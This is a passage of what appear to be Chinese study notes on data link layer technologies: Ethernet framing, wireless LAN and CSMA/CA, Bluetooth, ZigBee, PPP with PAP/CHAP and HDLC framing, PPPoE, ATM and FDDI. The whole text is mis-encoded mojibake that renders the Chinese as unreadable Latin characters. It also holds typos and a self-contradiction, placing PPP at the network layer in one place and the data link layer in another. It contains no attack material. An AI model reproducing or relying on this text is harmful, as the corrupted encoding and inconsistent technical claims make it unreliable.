è¾“å¸§æ—¶,åœ¨ä»¥å¤ªç½‘é¦–éƒ¨åŠ äººè¿™ä¸ª VID æ ‡ç­¾,æ ¹æ®è¿™ä¸ªå€¼å†³å®šå°†æ•°æ®å¸§å‘é€ç»™å“ªä¸ªç½‘æ®µã€‚ ä»¥å¤ªç½‘ åœ¨ä¼—å¤šæ•°æ®é“¾è·¯ä¸­æœ€ä¸ºè‘—åã€ä½¿ç”¨æœ€ä¸ºå¹¿æ³›çš„è«è¿‡äºä»¥å¤ªç½‘(Ethernet)â€ã€‚å®ƒçš„è§„èŒƒç®€å•,æ˜“äº NIC(ç½‘å¡)åŠé©±åŠ¨ç¨‹åºå®ç°ã€‚\nåœ¨ä»¥å¤ªç½‘æ™®åŠä¹‹åˆ,ä¸€èˆ¬é‡‡ç”¨å¤šå°ç»ˆç«¯ä½¿ç”¨åŒä¸€æ ¹åŒè½´ç”µç¼†çš„å…±äº«ä»‹è´¨å‹\u0026rsquo; è¿æ¥æ–¹å¼ã€‚ è€Œç°åœ¨,éšç€äº’è¿è®¾å¤‡çš„å¤„ç†èƒ½åŠ›ä»¥åŠä¼ è¾“é€Ÿåº¦çš„æé«˜,ä¸€èˆ¬éƒ½é‡‡ç”¨ç»ˆç«¯ä¸äº¤æ¢æœºä¹‹é—´ç‹¬å ç”µç¼†çš„æ–¹å¼å®ç°ä»¥å¤ªç½‘é€šä¿¡ ä»¥å¤ªç½‘çš„åˆ†ç±» 10BASE ä¸­çš„â€œ10â€ã€100BASE ä¸­çš„â€œ100â€ã€1000BASE ä¸­çš„â€œ1000â€ä»¥åŠ10CBASE ä¸­çš„â€œ10Gâ€åˆ†åˆ«æŒ‡10Mbpsã€100Mbpsã€IGbps ä»¥åŠ 10Gbps çš„ä¼ è¾“é€Ÿåº¦ã€‚ è€Œè¿½åŠ äºåé¢çš„â€œ5â€ã€â€œ2â€ã€â€œTâ€ã€â€œFâ€ç­‰å­—ç¬¦è¡¨ç¤ºçš„æ˜¯ä¼ è¾“ä»‹è´¨ã€‚ ä»¥å¤ªç½‘å¸§æ ¼å¼ [[#ä»¥å¤ªç½‘]]å¸§å‰ç«¯æœ‰ä¸€ä¸ªå«åšå‰å¯¼ç (Preamble)çš„éƒ¨åˆ†,å®ƒç”±0ã€1æ•°å­—äº¤æ›¿ç»„åˆè€Œæˆ,è¡¨ç¤ºä¸€ä¸ªä»¥å¤ªç½‘å¸§çš„å¼€å§‹,ä¹Ÿæ˜¯å¯¹ç«¯ç½‘å¡èƒ½å¤Ÿç¡®ä¿ä¸å…¶åŒæ­¥çš„æ ‡å¿—ã€‚ å‰å¯¼ç æœ«å°¾æ˜¯ä¸€ä¸€ä¸ªå«åš SFD (Start Frame Delimiter)çš„åŸŸ,å®ƒçš„å€¼æ˜¯â€œ11â€ã€‚åœ¨è¿™ä¸ªåŸŸä¹‹åå°±æ˜¯ä»¥å¤ªç½‘å¸§çš„æœ¬ä½“(å›¾3.20)ã€‚å‰å¯¼ç ä¸SFD åˆèµ·æ¥å 8ä¸ªå­—èŠ‚â€ã€‚ ä»¥å¤ªç½‘å¸§æœ¬ä½“çš„å‰ç«¯æ˜¯ä»¥å¤ªç½‘çš„é¦–éƒ¨,å®ƒæ€»å…±å 14ä¸ªå­—èŠ‚ã€‚åˆ†åˆ«æ˜¯6ä¸ªå­—èŠ‚çš„ç›®æ ‡ MACåœ°å€ã€6ä¸ªå­—èŠ‚çš„æºMACåœ°å€ä»¥åŠ2ä¸ªå­—èŠ‚çš„ä¸Šå±‚åè®®ç±»å‹ã€‚ IEEE802.3 Ethernet ä¸ä¸€èˆ¬çš„ä»¥å¤ªç½‘åœ¨å¸§çš„é¦–éƒ¨ä¸Šç¨æœ‰åŒºåˆ«ã€‚ä¸€èˆ¬ä»¥å¤ªç½‘å¸§ä¸­è¡¨ç¤ºç±»å‹çš„å­—æ®µ,åœ¨ IEEE802.3ä»¥å¤ªç½‘ä¸­å´è¡¨ç¤ºå¸§çš„é•¿åº¦ã€‚ ç´§éšå¸§å¤´åé¢çš„æ˜¯æ•°æ®ã€‚ä¸€ä¸ªæ•°æ®å¸§æ‰€èƒ½å®¹çº³çš„æœ€å¤§æ•°æ®èŒƒå›´æ˜¯ 46~1500ä¸ªå­—èŠ‚ã€‚å¸§å°¾æ˜¯ä¸€ä¸ªå«åš FCS(Ftame Check Sequence,å¸§æ£€éªŒåºåˆ—)çš„4ä¸ªå­—èŠ‚ã€‚å®ƒå¯ä»¥æ£€æŸ¥å¸§æ˜¯å¦æœ‰æ‰€æŸåã€‚åœ¨é€šä¿¡ä¼ è¾“è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°ç”µå­å—“å£°çš„å¹²æ‰°,å¯èƒ½ä¼šå½±å“å‘é€æ•°æ®å¯¼è‡´ä¹±ç ä½çš„å‡ºç°ã€‚ åœ¨ç›®æ ‡ MACåœ°å€ä¸­å­˜æ”¾äº†ç›®æ ‡å·¥ä½œç«™çš„ç‰©ç†åœ°å€ã€‚æºMACåœ°å€ä¸­åˆ™å­˜æ”¾æ„é€ ä»¥å¤ªç½‘å¸§çš„å‘é€ç«¯å·¥ä½œç«™çš„ç‰©ç†åœ°å€ã€‚\n[[#VLAN]]ä¸­,å¸§çš„æ ¼å¼åˆä¼šæœ‰æ‰€å˜åŒ– æ— çº¿é€šä¿¡ æ— çº¿é€šä¿¡,ä¾æ®é€šä¿¡è·ç¦»å¯åˆ†ä¸ºå¦‚è¡¨3.3æ‰€åˆ—å‡ºçš„ç±»å‹ã€‚IEEE802 å§”å‘˜ä¼šåˆ¶å®šäº†æ— çº¿PAN\u0026rsquo;(802.15)ã€æ— çº¿ LAN\u0026rsquo;(802. 11)ã€æ— çº¿ MAN\u0026rsquo;(802.16)ä»¥åŠæ— çº¿ RAN\u0026rsquo;(802.22)ç­‰æ— çº¿æ ‡å‡†ã€‚æ— çº¿ WAN\u0026rsquo;çš„æœ€å…¸å‹ä»£è¡¨å°±æ˜¯æ‰‹æœºé€šä¿¡ã€‚æ‰‹æœºé€šè¿‡åŸºç«™èƒ½å¤Ÿå®ç°é•¿è·ç¦»é€šä¿¡ã€‚\næ— çº¿LAN å…è®¸ä½¿ç”¨è€…å¯ä»¥è‡ªç”±åœ°ç§»åŠ¨ä½ç½®ã€è‡ªç”±åœ°æ”¾ç½®è®¾å¤‡,é€šè¿‡æ— çº¿ç”µæ³¢å®ç°è¾ƒå¹¿èŒƒå›´çš„é€šä¿¡ã€‚è¿™ä¹Ÿæ„å‘³ç€,åœ¨å…¶é€šä¿¡èŒƒå›´å†…,ä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨è¯¥æ— çº¿LAN,å› æ­¤ä¼šæœ‰è¢«ç›—å¬æˆ–ç¯¡æ”¹çš„å±é™©ã€‚ æ­¤å¤–,æ— çº¿LAN å¯ä»¥æ— éœ€ç‰Œç…§ä½¿ç”¨ç‰¹å®šé¢‘æ®µã€‚å› æ­¤æ— çº¿IAN çš„æ— çº¿ç”µæ³¢å¯èƒ½ä¼šæ”¶åˆ°å…¶ä»–é€šä¿¡è®¾å¤‡çš„å¹²æ‰°,å¯¼è‡´ä¿¡å·ä¸ç¨³å®šã€‚ä¾‹å¦‚åœ¨ä¸€å°å¾®æ³¢ç‚‰é™„è¿‘ä½¿ç”¨ä¸€ä¸ª2.4GHzå¸¦å®½çš„802.11b/gè®¾å¤‡å°±å¾—éœ€è¦æ³¨æ„ã€‚å¾®æ³¢ç‚‰å¯åŠ¨åçš„æ”¾å°„å‡ºæ¥çš„æ— çº¿ç”µæ³¢ä¸è®¾å¤‡é¢‘ç‡ç›¸è¿‘,äº§ç”Ÿçš„å¹²æ‰°å¯èƒ½ä¼šæ˜¾è‘—åœ°é™ä½è®¾å¤‡çš„ä¼ è¾“èƒ½åŠ›ã€‚\nIEEE802.11 IEEE802.11å®šä¹‰äº†æ— çº¿LAN åè®®ä¸­ç‰©ç†å±‚ä¸æ•°æ®é“¾è·¯å±‚çš„ä¸€éƒ¨åˆ†(MAC å±‚)ã€‚IEEE802.11 è¿™ä¸ªç¼–å·æœ‰æ—¶æŒ‡ä¼—å¤šæ ‡å‡†çš„ç»Ÿç§°,æœ‰æ—¶ä¹ŸæŒ‡æ— çº¿LAN çš„ä¸€ç§é€šä¿¡æ–¹å¼ã€‚ IEEE802.11 æ˜¯æ‰€æœ‰IEEE802.11 ç›¸å…³æ ‡å‡†çš„åŸºç¡€ã€‚å…¶ä¸­å®šä¹‰çš„æ•°æ®é“¾è·¯å±‚çš„ä¸€éƒ¨åˆ†(MACå±‚)é€‚ç”¨äºæ‰€æœ‰IEEE802.11 çš„å…¶ä»–æ ‡å‡†ã€‚\nMACå±‚ä¸­ç‰©ç†åœ°å€ä¸ä»¥å¤ªç½‘ç›¸åŒ,éƒ½ä½¿ç”¨MACåœ°å€,è€Œä»‹è´¨è®¿é—®æ§åˆ¶ä¸Šåˆ™ä½¿ç”¨CSAM/CD ç›¸ä¼¼çš„CSAM/ CAæ–¹å¼ã€‚é€šå¸¸é‡‡ç”¨æ— çº¿åŸºç«™å¹¶é€šè¿‡é«˜åŸºç«™å®ç°é€šä¿¡ã€‚\nCSMA/ CA CSMA/CAåè®®ä¸­ï¼Œå½“ä¸€ä¸ªç«™ç‚¹è¦å‘é€æ•°æ®æ—¶ï¼Œå®ƒä¼šå…ˆå‘é€ä¸€ä¸ªRTSï¼ˆè¯·æ±‚å‘é€ï¼‰å¸§ç»™æ¥æ”¶æ–¹ã€‚æ¥æ”¶æ–¹æ”¶åˆ°RTSå¸§åï¼Œä¼šå›å¤ä¸€ä¸ªCTSï¼ˆæ¸…é™¤å‘é€ï¼‰å¸§ã€‚åªæœ‰åœ¨æ¥æ”¶æ–¹å›å¤CTSå¸§åï¼Œå‘é€æ–¹æ‰èƒ½å‘é€æ•°æ®ã€‚è¿™æ ·å¯ä»¥é¿å…å¤šä¸ªç«™ç‚¹åŒæ—¶å‘é€æ•°æ®å¯¼è‡´çš„å†²çªã€‚\nCSMA/CDå’ŒCSMA/åŒºåˆ«\nç‰¹å¾ CSMA/CD CSMA/CA æœ‰æ•ˆæ€§ å‘ç”Ÿå†²çªåç”Ÿæ•ˆ é˜²æ­¢å†²çªå‘ç”Ÿ ç”¨é€” æœ‰çº¿ç½‘ç»œ æ— çº¿ç½‘ç»œ åŠŸèƒ½ å‡å°‘æ¢å¤æ—¶é—´ æœ€å°åŒ–å†²çªå¯èƒ½æ€§ æ•°æ®å¸§é‡ä¼  å‘ç”Ÿå†²çªæ—¶é‡ä¼ æ•°æ®å¸§ å…ˆå‘é€æ•°æ®ä¼ è¾“æ„å›¾ï¼Œå†å‘é€æ•°æ® æ ‡å‡† 802.3æ ‡å‡† 802.11æ ‡å‡† WIFI Wi-Fiæ˜¯ WECA(Wireless Fthernet Compatability Alliance,æ— çº¿ä»¥å¤ªç½‘å…¼å®¹æ€§è”ç›Ÿ)ä¸ºæ™®åŠ IEEE802.11 çš„å„ç§æ ‡å‡†è€Œæ‰“é€ çš„ä¸€ä¸ªå“ç‰Œåç§°ã€‚\nè“ç‰™ è“ç‰™ä¸ IEEE802.11b/g ç±»ä¼¼,æ˜¯ä½¿ç”¨2.4GHz é¢‘ç‡æ— çº¿ç”µæ³¢çš„ä¸€ç§æ ‡å‡†â€ã€‚æ•°æ®ä¼ è¾“é€Ÿç‡åœ¨ V2 ä¸­èƒ½è¾¾åˆ°3Mbps(å®é™…æœ€å¤§ååé‡ä¸º2.1Mbps)ã€‚é€šä¿¡è·ç¦»æ ¹æ®æ— çº¿ç”µæ³¢çš„ä¿¡å·çš„å¼ºå¼±,æœ‰1mã€10mã€100m ä¸‰ç§ç±»å‹ã€‚é€šä¿¡ç»ˆç«¯æœ€å¤šå…è®¸8å°è®¾å¤‡ã€‚\nZigBee ZieBee ä¸»è¦åº”ç”¨äºå®¶ç”µçš„è¿œç¨‹æ§åˆ¶â€,æ˜¯ä¸€ç§çŸ­è·ç¦»ã€ä½åŠŸè€—çš„æ— çº¿é€šä¿¡æŠ€æœ¯ã€‚å®ƒæœ€å¤šå…è®¸65536 ä¸ªç»ˆç«¯ä¹‹é—´äº’è¿é€šä¿¡ã€‚ZigBee çš„ä¼ è¾“é€Ÿåº¦éšç€æ‰€ä½¿ç”¨çš„é¢‘ç‡æœ‰æ‰€å˜åŒ–ã€‚ä½†åœ¨æ—¥æœ¬,ä½¿ç”¨2.4GHz é¢‘ç‡çš„è®¾å¤‡æœ€é«˜å¯è¾¾250kpbsÂ®ã€‚\nPPP PPP(Point-to-Point Protocol)æ˜¯æŒ‡ç‚¹å¯¹ç‚¹,å³1å¯¹1è¿æ¥è®¡ç®—æœºçš„åè®®ã€‚ åœ¨ç†è®ºä¸Šï¼ŒPPP åè®®å±äºç½‘ç»œå±‚ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼ŒPPP åè®®é€šå¸¸ç”¨äºåœ¨æ•°æ®é“¾è·¯å±‚ä¸Šä½¿ç”¨ã€‚\nPPP å±äºçº¯ç²¹çš„æ•°æ®é“¾è·¯å±‚,ä¸ç‰©ç†å±‚æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚æ¢å¥è¯è¯´,ä»…æœ‰PPP æ— æ³•å®ç°é€šä¿¡,è¿˜éœ€è¦æœ‰ç‰©ç†å±‚çš„æ”¯æŒã€‚ PPPå¯ä»¥ä½¿ç”¨ç”µè¯çº¿æˆ–ISDNã€ä¸“çº¿ã€ATM çº¿è·¯ã€‚æ­¤å¤–,è¿‘äº›å¹´äººä»¬æ›´å¤šæ˜¯åœ¨ç”¨ ADSL æˆ–æœ‰çº¿ç”µè§†é€šè¿‡ PPPoE (PPP over Ethernet)å®ç°äº’è”ç½‘æ¥äººã€‚PPPOE æ˜¯åœ¨ä»¥å¤ªç½‘çš„æ•°æ®ä¸­åŠ å…¥ PPP å¸§è¿›è¡Œä¼ è¾“çš„ä¸€ç§æ–¹å¼ã€‚\nPPPå’Œä»¥å¤ªç½‘çš„åŒºåˆ«\nç‰¹å¾ PPP ä»¥å¤ªç½‘ å±‚ ç½‘ç»œå±‚ é“¾è·¯å±‚ ä½œç”¨ å»ºç«‹ç‚¹å¯¹ç‚¹è¿æ¥ åœ¨å¤šä¸ªè®¾å¤‡ä¹‹é—´å…±äº«ä»‹è´¨ å°è£… å°è£… IP æ•°æ®åŒ… ä¸å°è£… ä½¿ç”¨åœºæ™¯ è¿œç¨‹è®¿é—®ã€æ‹¨å·è¿æ¥ å±€åŸŸç½‘ã€å¹¿åŸŸç½‘ åœ¨PPPçš„ä¸»è¦åŠŸèƒ½ä¸­åŒ…æ‹¬ä¸¤ä¸ªåè®®:ä¸€ä¸ªæ˜¯ä¸ä¾èµ–ä¸Šå±‚çš„LCP åè®®(Link Control Protocol),å¦ä¸€ä¸ªæ˜¯ä¾èµ–ä¸Šå±‚çš„ NCP åè®®(Network Control Protocol)ã€‚å¦‚æœä¸Šå±‚ä¸ºIP,æ­¤æ—¶çš„ NCP ä¹Ÿå«åš IPCP (IP Control Protocol)ã€‚ LCP LCP ä¸»è¦è´Ÿè´£å»ºç«‹å’Œæ–­å¼€è¿æ¥ã€è®¾ç½®æœ€å¤§æ¥æ”¶å•å…ƒ(MRU,Maximum Receive Unit)ã€è®¾ç½®éªŒè¯åè®®(PAP æˆ–CHAP)ä»¥åŠè®¾ç½®æ˜¯å¦è¿›è¡Œé€šä¿¡è´¨é‡çš„ç›‘æ§ã€‚\nNCP è€Œ IPCP åˆ™è´Ÿè´£IP åœ°å€è®¾ç½®ä»¥åŠæ˜¯å¦è¿›è¡Œ TCP/IP é¦–éƒ¨å‹ç¼©ç­‰è®¾å¤‡â€ã€‚\né€šè¿‡PPPè¿æ¥æ—¶,é€šå¸¸éœ€è¦è¿›è¡Œç”¨æˆ·åå¯†ç çš„éªŒè¯,å¹¶ä¸”å¯¹é€šä¿¡ä¸¤ç«¯è¿›è¡ŒåŒæ–¹å‘çš„éªŒè¯ã€‚å…¶éªŒè¯åè®®æœ‰ä¸¤ç§,åˆ†åˆ«ä¸ºPAP(Password Authentication Protocol) å’Œ CHAP(Challenge Handshake Authentication Protocol)ã€‚\nPAP PAPæ˜¯PPPè¿æ¥å»ºç«‹æ—¶,é€šè¿‡ä¸¤æ¬¡æ¡æ‰‹è¿›è¡Œç”¨æˆ·åå’Œå¯†ç éªŒè¯ã€‚å…¶ä¸­å¯†ç ä»¥æ˜æ–‡æ–¹å¼ä¼ è¾“ã€‚å› æ­¤ä¸€èˆ¬ç”¨äºå®‰å…¨è¦æ±‚å¹¶ä¸å¾ˆé«˜çš„ç¯å¢ƒ,å¦åˆ™ä¼šæœ‰çªƒå¬æˆ–ç›—ç”¨è¿æ¥çš„å±é™©ã€‚\nCHAP CHAP åˆ™ä½¿ç”¨ä¸€æ¬¡æ€§å¯†ç  OTP(One Time Password),å¯ä»¥æœ‰æ•ˆé˜²æ­¢çªƒå¬ã€‚æ­¤å¤–,åœ¨å»ºç«‹è¿æ¥åè¿˜å¯ä»¥è¿›è¡Œå®šæœŸçš„å¯†ç äº¤æ¢,ç”¨æ¥æ£€éªŒå¯¹ç«¯æ˜¯å¦ä¸­é€”è¢«æ›¿æ¢ã€‚\nPPP çš„å¸§æ ¼å¼ PPP çš„æ•°æ®å¸§æ ¼å¼å¦‚å›¾3.26æ‰€ç¤ºã€‚å…¶ä¸­æ ‡å¿—ç ç”¨æ¥åŒºåˆ†æ¯ä¸ªå¸§ã€‚è¿™ä¸€ç‚¹ä¸HDLC\u0026rsquo;åè®®éå¸¸ç›¸ä¼¼,å› ä¸ºPPPæœ¬èº«å°±æ˜¯åŸºäº HDICåˆ¶å®šå‡ºæ¥çš„ä¸€ç§åè®®ã€‚ HDLC HDLC å°±æ˜¯åœ¨æ¯ä¸ªå¸§çš„å‰ååŠ ä¸Šä¸€ä¸ª8ä½å­—èŠ‚â€œ01111110â€ç”¨æ¥åŒºåˆ†å¸§ã€‚è¿™ä¸€ä¸ª8ä½å­—èŠ‚å«åšæ ‡å¿—ç ã€‚ åœ¨ä¸¤ä¸ªæ ‡å¿—ç ä¸­é—´ä¸å…è®¸å‡ºç°è¿ç»­6ä¸ªä»¥ä¸Šçš„â€œ1â€ã€‚å› æ­¤,åœ¨å‘é€å¸§çš„æ—¶å€™,å½“å‡ºç°è¿ç»­5ä¸ªâ€œ1â€æ—¶åé¢å¿…é¡»æ’äººä¸€ä¸ª0ã€‚è€Œå½“æ¥æ”¶ç«¯åœ¨æ¥æ”¶å¸§æ—¶,å¦‚æœæ”¶åˆ°è¿ç»­çš„5ä¸ªâ€œ1â€ä¸”åé¢è·Ÿç€çš„æ˜¯0,å°±å¿…é¡»åˆ é™¤ã€‚ç”±äºæœ€å¤šåªä¼šå‡ºç°5ä¸ªè¿ç»­çš„â€œ1â€,å°±å¯ä»¥æ¯”è¾ƒå®¹æ˜“åœ°é€šè¿‡æ ‡å¿—ç åŒºåˆ†å¸§çš„èµ·å§‹ä¸ç»ˆæ­¢ã€‚è€ŒPPPæ ‡å‡†å¸§æ ¼å¼ä¸æ­¤å®Œå…¨ç›¸åŒã€‚\nå¦å¤–,åœ¨é€šè¿‡ç”µè„‘è¿›è¡Œæ‹¨å·æ—¶,PPP å·²åœ¨è½¯ä»¶ä¸­å®ç°ã€‚å› æ­¤,é‚£äº›æ’äººæˆ–åˆ é™¤â€œ0â€çš„æ“ä½œæˆ–FCS è®¡ç®—éƒ½äº¤ç”±ç”µè„‘çš„CPU å»å¤„ç†ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆäººä»¬å¸¸è¯´PPPè¿™ç§æ–¹å¼ä¼šç»™è®¡ç®—æœºå¸¦æ¥å¤§é‡è´Ÿè·çš„åŸå› æ‰€åœ¨ã€‚\nPPPoE åœ¨è¿™ç§äº’è”ç½‘æ¥å…¥æœåŠ¡ä¸­,é€šä¿¡çº¿è·¯ç”±ä»¥å¤ªç½‘æ¨¡æ‹Ÿã€‚ç”±äºä»¥å¤ªç½‘è¶Šæ¥è¶Šæ™®åŠ, åœ¨åŠ ä¸Šå®ƒçš„ç½‘ç»œè®¾å¤‡ä¸ç›¸åº”çš„NICä»·æ ¼æ¯”è¾ƒä¾¿å®œ,å› è€ŒISP èƒ½å¤Ÿæä¾›ä¸€ä¸ªå•ä»·æ›´ä½çš„äº’è”ç½‘æ¥äººæœåŠ¡ã€‚ å•çº¯çš„ä»¥å¤ªç½‘æ²¡æœ‰éªŒè¯åŠŸèƒ½,ä¹Ÿæ²¡æœ‰å»ºç«‹å’Œæ–­å¼€è¿æ¥çš„å¤„ç†,å› æ­¤æ— æ³•æŒ‰æ—¶è®¡è´¹ã€‚è€Œå¦‚æœé‡‡ç”¨PPPoE ç®¡ç†ä»¥å¤ªç½‘è¿æ¥,å°±å¯ä»¥åˆ©ç”¨ PPPçš„éªŒè¯ç­‰åŠŸèƒ½ä½¿å„å®¶ISP å¯ä»¥æœ‰æ•ˆåœ°ç®¡ç†ç»ˆç«¯ç”¨æˆ·çš„ä½¿ç”¨ã€‚ ATM ATM(Asynchronous Transfer Mode)æ˜¯ä»¥ä¸€ä¸ªå«åšä¿¡å…ƒ(5å­—èŠ‚é¦–éƒ¨åŠ 48å­—èŠ‚æ•°æ®)çš„å•ä½è¿›è¡Œä¼ è¾“çš„æ•°æ®é“¾è·¯,ç”±äºå…¶çº¿è·¯å ç”¨æ—¶é—´çŸ­å’Œèƒ½å¤Ÿé«˜æ•ˆä¼ è¾“å¤§å®¹é‡æ•°æ®ç­‰ç‰¹ç‚¹ä¸»è¦ç”¨äºå¹¿åŸŸç½‘ç»œçš„è¿æ¥ã€‚\nATM æ˜¯é¢å‘è¿æ¥çš„ä¸€ç§æ•°æ®é“¾è·¯ã€‚å› æ­¤åœ¨è¿›è¡Œé€šä¿¡ä¼ è¾“ä¹‹å‰ä¸€å®šè¦è®¾ç½®é€šä¿¡çº¿è·¯ã€‚è€ŒATMåˆä¸ä¼ ç»Ÿç”µè¯ä¸åŒ,å®ƒå…è®¸åŒæ—¶ä¸å¤šä¸ªå¯¹ç«¯å»ºç«‹é€šä¿¡è¿æ¥ã€‚\nATMä¸­æ²¡æœ‰ç±»ä¼¼ä»¥å¤ªç½‘å’ŒFDDIé‚£ç§å‘é€æƒé™çš„é™åˆ¶ã€‚å®ƒå…è®¸åœ¨ä»»ä½•æ—¶å€™å‘é€ä»»ä½•æ•°æ®ã€‚å› æ­¤,å½“å¤§é‡è®¡ç®—æœºåŒæ—¶å‘é€å¤§é‡æ•°æ®æ—¶å®¹æ˜“å¼•å‘ç½‘ç»œæ‹¥å µç”šè‡³ä½¿ç½‘ç»œè¿›å…¥æ”¶æ•›çŠ¶æ€â€ã€‚ä¸ºäº†é˜²æ­¢è¿™ä¸€ç°è±¡çš„å‡ºç°,ATM ä¸­ä¹Ÿå¢åŠ äº†é™åˆ¶å¸¦å®½çš„ç»†åˆ†åŠŸèƒ½\næ³¨ï¼šæ”¶æ•›çŠ¶æ€æŒ‡å½“ç½‘ç»œéå¸¸æ‹¥å µæ—¶,è·¯ç”±å™¨æˆ–äº¤æ¢æœºæ— æ³•å®ŒæˆåŒ…çš„å¤„ç†,ä»è€Œä¸¢å¼ƒè¿™äº›åŒ…çš„ä¸€ç§çŠ¶æ€ã€‚\nATMæ‰©å±•äº† TDM,èƒ½å¤Ÿæœ‰æ•ˆåœ°æé«˜çº¿è·¯çš„åˆ©ç”¨ç‡\u0026rsquo;ã€‚ATM åœ¨ TDM çš„æ—¶éš™ä¸­æ”¾å…¥æ•°æ®æ—¶,å¹¶éæŒ‰ç…§çº¿è·¯çš„é¡ºåºè€Œæ˜¯æŒ‰ç…§æ•°æ®åˆ°è¾¾çš„é¡ºåºæ”¾å…¥ã€‚ ä¸ºæ­¤,å‘é€ç«¯è¿˜éœ€è¦é™„åŠ ä¸€ä¸ª5å­—èŠ‚çš„åŒ…é¦–éƒ¨,åŒ…å« VPI(Virtual Path Identifier)ã€VCI (Virtual Channel Identifier)ç­‰è¯†åˆ«ç â€ç”¨æ¥æ ‡è¯†å…·ä½“çš„é€šä¿¡ç±»å‹ã€‚è¿™ç§VPI ä¸VCIçš„å€¼åªåœ¨ç›´è¿é€šä¿¡çš„ä¸¤ä¸ªATMäº¤æ¢æœºä¹‹é—´è®¾ç½®ã€‚åœ¨å…¶ä»–äº¤æ¢æœºä¹‹é—´æ„æ€åˆ™å®Œå…¨ä¸åŒã€‚ ATMä¸­ä¿¡å…ƒä¼ è¾“æ‰€å ç”¨çš„æ—¶éš™ä¸å›ºå®š,ä¸€ä¸ªå¸§æ‰€å ç”¨çš„æ—¶éš™æ•°ä¹Ÿä¸å›ºå®š,è€Œä¸”æ—¶éš™ä¹‹é—´å¹¶ä¸è¦æ±‚è¿ç»­ã€‚è¿™äº›ç‰¹ç‚¹å¯ä»¥æœ‰æ•ˆå‡å°‘ç©ºé—²æ—¶éš™, ä»è€Œæé«˜çº¿è·¯çš„åˆ©ç”¨ç‡ã€‚åªä¸è¿‡éœ€è¦é¢å¤–é™„åŠ 5ä¸ªå­—èŠ‚çš„é¦–éƒ¨,å¢åŠ äº†ç½‘ç»œçš„å¼€é”€â€,å› æ­¤ä¹Ÿåœ¨ä¸€å®šç¨‹åº¦ä¸Šé™ä½äº†é€šä¿¡é€Ÿåº¦ã€‚\nåœ¨ä»¥å¤ªç½‘ä¸­ä¸€ä¸ªå¸§æœ€å¤§å¯ä¼ è¾“1500ä¸ªå­—èŠ‚,FDDI å¯ä»¥æœ€å¤§ä¼ è¾“ 4352å­—èŠ‚ã€‚ è€ŒATM çš„ä¸€ä¸ªä¿¡å…ƒå´åªèƒ½å‘é€å›ºå®šçš„48å­—èŠ‚æ•°æ®ã€‚è¿™48ä¸ªå­—èŠ‚çš„æ•°æ®éƒ¨åˆ†ä¸­è‹¥åŒ…å«IP é¦–éƒ¨å’ŒTCPé¦–éƒ¨åˆ™åŸºæœ¬æ— æ³•å­˜æ”¾ä¸Šå±‚çš„æ•°æ®ã€‚ä¸ºæ­¤,ä¸€èˆ¬ä¸ä¼šå•ç‹¬ä½¿ç”¨ATM,è€Œæ˜¯ä½¿ç”¨ä¸Šå±‚çš„AAL(ATM Adapter Layer)ã€‚ åœ¨ä¸Šå±‚ä¸ºIP çš„æƒ…å†µä¸‹,åˆ™å«åš AAISã€‚æ¯ä¸ªIPåŒ…è¢«é™„åŠ å„å±‚çš„åè®®é¦–éƒ¨ä»¥å,æœ€å¤šå¯ä»¥è¢«åˆ†ä¸º192ä¸ªä¿¡å…ƒå‘é€å‡ºå»ã€‚ ä»è¿™ä¸ªå›¾ä¸­è¿˜å¯ä»¥çœ‹å‡º,åœ¨æ•´ä¸ª192ä¸ªä¿¡å…ƒä¸­åªè¦æœ‰ä¸€ä¸ªä¸¢å¤±,é‚£ä¹ˆæ•´ä¸ªIP åŒ…å°±ç›¸å½“äºè¢«æŸåã€‚æ­¤æ—¶,AAL5 çš„å¸§æ£€æŸ¥ä½æŠ¥é”™,å¯¼è‡´æ¥æ”¶ç«¯ä¸å¾—ä¸ä¸¢å¼ƒæ‰€æœ‰çš„ä¿¡å…ƒã€‚å‰é¢æ›¾æåˆ° TCP/IP åœ¨åŒ…å‘ç”Ÿå¼‚å¸¸çš„æ—¶å€™å¯ä»¥å®ç°é‡å‘,å› æ­¤åœ¨ ATMç½‘ä¸­å³ä½¿åªæ˜¯ä¸€ä¸ªä¿¡å…ƒä¸¢å¤±,ä¹Ÿè¦é‡æ–°å‘é€æœ€å¤š192ä¸ªä¿¡å…ƒã€‚è¿™ä¹Ÿæ˜¯ATMåˆ°ç›®å‰ä¸ºæ­¢çš„æœ€å¤§å¼Šç«¯ã€‚ä¸€ä¸”åœ¨ç½‘ç»œæ‹¥å µçš„æƒ…å†µä¸‹,åªè¦ä¸¢æ‰å“ªæ€•1%çš„ä¿¡å…ƒä¹Ÿä¼šå¯¼è‡´æ•´ä¸ªæ•°æ®éƒ½æ— æ³•æ¥æ”¶ã€‚ç‰¹åˆ«æ˜¯ç”±äº ATM æ²¡æœ‰å‘é€æƒé™ä¸Šçš„æ§åˆ¶,å¾ˆå®¹æ˜“å¯¼è‡´ç½‘ç»œæ”¶æ•›ã€‚\nPOS POS (Packet over SDH/SONET)æ˜¯ä¸€ç§åœ¨ SDHY(SONET\u0026rsquo;)ä¸Šè¿›è¡ŒåŒ…é€šä¿¡çš„ä¸€ç§åè®®ã€‚SDH(SONET)æ˜¯åœ¨å…‰çº¤ä¸Šä¼ è¾“æ•°å­—ä¿¡å·çš„ç‰©ç†å±‚è§„èŒƒã€‚\nFDDI FDDI(Fiber Distributed Data Interface)å«åšåˆ†å¸ƒå¼å…‰çº¿æ•°æ®æ¥å£ã€‚æ›¾å‡ ä½•æ—¶,äººä»¬ä¸ºäº†ç”¨å…‰çº¤å’ŒåŒç»çº¿å®ç°100Mbps çš„ä¼ è¾“é€Ÿç‡,åœ¨ä¸»å¹²ç½‘æˆ–è®¡ç®—æœºä¹‹é—´çš„é«˜é€Ÿè¿æ¥ä¸Šå¹¿æ³›ä½¿ç”¨äº† FDDIã€‚ä½†æ˜¯ç”±äºåæ¥é«˜é€Ÿ LAN æä¾›äº† Gbps çº§çš„ä¼ è¾“é€Ÿç‡,FDDI ä¹Ÿå°±é€æ¸æ·¡å‡ºäº†åº”ç”¨é¢†åŸŸã€‚ FDDI é‡‡ç”¨ä»¤ç‰Œ(è¿½åŠ ä»¤ç‰Œ)ç¯çš„è®¿é—®æ–¹å¼ã€‚ä»¤ç‰Œç¯è®¿é—®æ–¹å¼åœ¨ç½‘ç»œæ‹¥å 